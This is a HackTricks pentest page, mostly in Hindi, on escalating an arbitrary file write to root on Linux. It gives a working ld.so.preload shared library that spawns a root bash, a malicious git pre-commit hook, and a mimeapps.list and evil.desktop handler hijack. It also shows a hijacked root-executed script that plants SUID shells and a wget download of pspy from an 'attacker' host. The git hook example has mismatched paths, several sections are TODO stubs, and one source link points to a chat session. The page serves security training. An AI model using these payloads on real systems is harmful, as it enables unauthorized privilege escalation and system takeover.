# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

यह फ़ाइल **`LD_PRELOAD`** env variable की तरह व्यवहार करती है लेकिन यह **SUID binaries** में भी काम करती है.\
यदि आप इसे बना सकते हैं या संशोधित कर सकते हैं, तो आप बस प्रत्येक निष्पादित बाइनरी के साथ लोड की जाने वाली लाइब्रेरी का **path** जोड़ सकते हैं।

उदाहरण के लिए: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) ऐसे **scripts** हैं जो git repository में विभिन्न **events** पर **run** होते हैं, जैसे जब कोई commit बनाया जाता है या merge होता है... इसलिए अगर कोई **privileged script or user** ये actions बार‑बार कर रहा हो और `.git` फोल्डर में **write** करने की अनुमति हो, तो इसे **privesc** के लिए इस्तेमाल किया जा सकता है।

उदाहरण के लिए, git repo में **generate a script** करके **`.git/hooks`** में रखा जा सकता है ताकि यह नया commit बनने पर हमेशा execute हो:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt_misc

`/proc/sys/fs/binfmt_misc` में स्थित फाइल यह बताती है कि किस बाइनरी को किस प्रकार की फाइलें execute करनी चाहिए। TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.

### Overwrite schema handlers (like http: or https:)

यदि हमलावर को पीड़ित की configuration डायरेक्टरीज़ में लिखने की अनुमति है, तो वह आसानी से ऐसी फाइलें बदल या बना सकता है जो सिस्टम व्यवहार बदल दें और अनचाहे कोड निष्पादन का कारण बनें। यदि `$HOME/.config/mimeapps.list` फाइल को संशोधित कर HTTP और HTTPS URL handlers को किसी malicious फाइल की ओर पॉइंट किया जाए (उदा., `x-scheme-handler/http=evil.desktop` सेट करना), तो हमलावर यह सुनिश्चित कर लेता है कि **किसी भी http या https लिंक पर क्लिक करने पर उस `evil.desktop` फाइल में निर्दिष्ट कोड चल जाएगा**। उदाहरण के लिए, यदि `$HOME/.local/share/applications` में `evil.desktop` में निम्न malicious कोड रखा गया हो, तो किसी भी external URL पर क्लिक करने पर एम्बेडेड कमांड चल जाएगा:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
अधिक जानकारी के लिए [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) देखें जहाँ इसे एक real vulnerability को exploit करने के लिए इस्तेमाल किया गया था।

### Root executing user-writable scripts/binaries

यदि कोई privileged workflow कुछ ऐसा चलाता है जैसे `/bin/sh /home/username/.../script` (या कोई भी binary जो एक unprivileged user द्वारा owned directory के अंदर है), तो आप इसे hijack कर सकते हैं:

- **Detect the execution:** प्रक्रियाओं को monitor करें with [pspy](https://github.com/DominicBreuker/pspy) ताकि root द्वारा user-controlled paths को invoke करते हुए पकड़ा जा सके:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** सुनिश्चित करें कि लक्षित फ़ाइल और उसकी डायरेक्टरी दोनों आपके उपयोगकर्ता के स्वामित्व/लिखने योग्य हों।
- **Hijack the target:** मूल binary/script का बैकअप लें और एक payload डालें जो SUID shell बनाता है (या कोई अन्य root action), फिर permissions को पुनर्स्थापित करें:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **विशेषाधिकार वाली क्रिया सक्रिय करें** (उदा., ऐसी UI बटन दबाना जो helper को spawn करे)। जब root hijacked path को पुनः निष्पादित करे, तो `./rootshell -p` के साथ escalated shell प्राप्त करें।

## संदर्भ

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)

{{#include ../../banners/hacktricks-training.md}}
